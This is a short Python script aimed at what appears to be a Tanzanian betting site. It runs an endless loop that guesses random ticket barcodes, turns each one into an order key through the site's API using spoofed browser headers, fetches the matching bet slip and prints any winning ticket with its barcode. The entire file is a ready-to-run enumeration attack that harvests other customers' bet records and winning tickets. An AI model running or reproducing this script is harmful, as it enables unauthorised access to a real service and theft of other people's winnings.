import requests
import json
from bs4 import BeautifulSoup
import pandas
import random

def getKey(key):
	link = "https://gsb.co.tz:443/Services/onlineapi/Bet/GetOrderKey"
	headers = {
	"Sec-Ch-Ua": "\"Chromium\";v=\"105\", \"Not)A;Brand\";v=\"8\"", 
	"Sec-Ch-Ua-Mobile": "?0", 
	"Sec-Ch-Ua-Platform": "\"Linux\"", 
	"Upgrade-Insecure-Requests": "1", 
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36", 
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
	"Sec-Fetch-Site": "same-origin", 
	"Sec-Fetch-Mode": "navigate", 
	"Sec-Fetch-Dest": "iframe", 
	"Referer": "https://gsb.co.tz/", 
	"Accept-Encoding": "gzip, deflate", 
	"Accept-Language": "en-US,en;q=0.9"
	}
	data = {
	"Barcode": int(key), 
	"Language": "en-US", 
	"terminal": "gsb.co.tz"
	}

	resp = requests.post(link, headers=headers, json=data).json()
	#print(resp)
	if resp["isSuccessfull"]:
		return resp["orderKey"]
	else:
		return "failed to get order key"

def checkMkeka(key):
	link = "https://gsb.co.tz:443/Services/PrintService/Orders/GetOrder?q={}"
	headers = {
	"Sec-Ch-Ua": "\"Chromium\";v=\"105\", \"Not)A;Brand\";v=\"8\"", 
	"Sec-Ch-Ua-Mobile": "?0", 
	"Sec-Ch-Ua-Platform": "\"Linux\"", 
	"Upgrade-Insecure-Requests": "1", 
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36", 
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
	"Sec-Fetch-Site": "same-origin", 
	"Sec-Fetch-Mode": "navigate", 
	"Sec-Fetch-Dest": "iframe", 
	"Referer": "https://gsb.co.tz/", 
	"Accept-Encoding": "gzip, deflate", 
	"Accept-Language": "en-US,en;q=0.9"
	}

	resp = requests.get(link.format(key), headers=headers).text
	if "Order Not Found" not in resp:
		return resp
	else:
		return False

def ShowBetInfo(html):
	bs = BeautifulSoup(html, "html.parser")
	WL = True if bs.find("h1").text != "Lost" else False
	if WL:
		winStat = str(pandas.read_html(str(bs))[0])
		return winStat
	else:
		return "Lost"

def main():
	while True:
		try:
			key = "230126" + str(random.randint(100000000, 999999999))
			enc_key = getKey(key)
			#print(enc_key)
			mkeka = checkMkeka(enc_key)
			#print(mkeka)
			if mkeka:
				WinLose = ShowBetInfo(mkeka)
				if WinLose != "Lost":
					print(f"WIN : {key}\n\n{str(WinLose)}")
				else:
					print("LOST : {}".format(key))
			else:
				print("WRONG : {}".format(key))
		except Exception as E:
			print(E)
			break
		# break

if __name__ == '__main__':
	main()